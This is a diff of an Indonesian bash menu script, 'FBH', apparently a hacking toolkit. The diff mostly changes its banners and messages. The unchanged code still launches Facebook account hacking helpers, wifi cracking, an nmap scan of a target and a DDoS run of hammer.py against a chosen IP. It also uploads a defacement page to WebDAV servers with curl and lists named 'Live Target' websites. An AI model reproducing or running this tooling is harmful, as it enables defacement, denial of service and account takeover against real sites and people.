@@ -22,11 +22,7 @@ echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
 trap ctrl_c INT
 ctrl_c() {
 clear
-echo -e $blue " © (Ctrl + C ) Detected, Trying To Exit ... "
-echo -e $green " © Thanks"
-sleep 1
-echo -e $cyan " © Semoga Bermanfaat "
-echo -e $purple " © By AsecC eror404 :)..."
+echo -e $red "[!]KELUAR"
 sleep 1
 exit
 }
@@ -36,19 +32,25 @@ while [ $lagi -lt 14 ];
 do
 echo
 echo
-echo -e $purple
+echo -e $red
 read -p "FBH ==>" pil;
 
 case $pil in
 help)
 clear
 echo""
-echo -e $red "   *Commmend*          *Info*"
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
 echo ""
+echo -e $red "   *Commmend*          *Info*"
 echo ""
 echo -e $cyan "     FBH_t           =$purple""Hack FB target"
 echo -e $cyan "     FBH_r           =$purple""Hack FB rombongan"
-echo -e $cyan "     FBH_w           =$purple""Hack wifi (Root)"
+echo -e $cyan "     FBH_w           =$purple""Hack wifi (Root"
 echo -e $cyan "     FBH_n           =$purple""Scan Web"
 echo -e $cyan "     FBH_d           =$purple""Deface webdav"
 echo -e $cyan "     FBH_o           =$purple""DDOS Attack (hammer)"
@@ -73,6 +75,13 @@ python2 .FBHrombongan.py
 
 FBH_n)
 clear
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
 echo -e $cyan "Masukan Web Target:"
 read web
 nmap -v -A $web
@@ -81,6 +90,13 @@ nmap -v -A $web
 
 FBH_d)
 clear
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
 echo -e $blue "++++++++++++++Live Target++++++++++++++++++ "
 echo -e $red "####################################"
 echo -e $cyan " ® bitsandpieces.co.za"
@@ -99,20 +115,20 @@ echo -e $red "#####################################"
 echo -e $blue "++++++++++++++++ThankS++++++++++++++++++++++"
 echo
 sleep 1
-echo -e $cyan "${y} © Masukan Script Deface [ script simpan di penyimpanan internal, ex:index.html ]:"
+echo -e $cyan "${y} [?]Masukan Script Deface [ script simpan di penyimpanan internal, ex:index.html ]:"
 read sc
-echo -e $purple "${y} ® Masukan Web TarGet"
+echo -e $purple "${y} [?]Masukan Web TarGet"
 read web
-echo -e $cyan " ®Loading...."
+echo -e $cyan " [*]Loading...."
 sleep 3
-echo -e $blue " ®sedang memuat.."
+echo -e $blue " [*]sedang memuat.."
 sleep 3
-echo -e $green " ®Tunggu sebentar.."
+echo -e $green " [*]Tunggu sebentar.."
 sleep 3
 curl -T /sdcard/$sc $web
-echo -e $cyan " ®Selesai..."
+echo -e $cyan " [*]Selesai..."
 sleep 2
-echo -e $red "${y} ®Hasil=" $web/$sc
+echo -e $red "${y} [√]Hasil=" $web/$sc
 sleep 5
 
 ;;
@@ -125,6 +141,13 @@ python2 .wifite.py
 
 FBH_o)
 clear
+echo -e $purple "               ___   ___   _  _   "
+echo -e $cyan "               | __| | _ ) | || |  *AsecC|~|eror404"
+echo -e $cyan "               | _|  | _ \ | __ |  "
+echo -e $blue "              _|_|_  |___/ |_||_|  "
+echo -e $red '        |"""""|| """ |HaxID|"""""||"""""| '
+echo -e $cyan "            *-0-0-***-0-0-***-0-0-*   "
+echo ""
 echo -e $cyan "Masukan IP Target:"
 read ip
 python3 .hammer.py -s $ip -p 80 -t 135
@@ -149,15 +172,15 @@ python2 .create.py
 
 ;;
 
-exit) echo -e $purple " ® Created By : AsecC eror404"
+exit) echo -e $red " [!]KELUAR"
 sleep 1
-echo -e $cyan " ® Terima Kasih"
+echo -e $cyan " [√]Terima Kasih"
 sleep 1
 exit
 
 ;;
 
-*) echo -e $red " ® ketik help untuk informasi lengkapnya!!! "
+*) echo -e $red " [!]ketik help untuk informasi lengkapnya!!! "
 sleep 2
 esac
 done
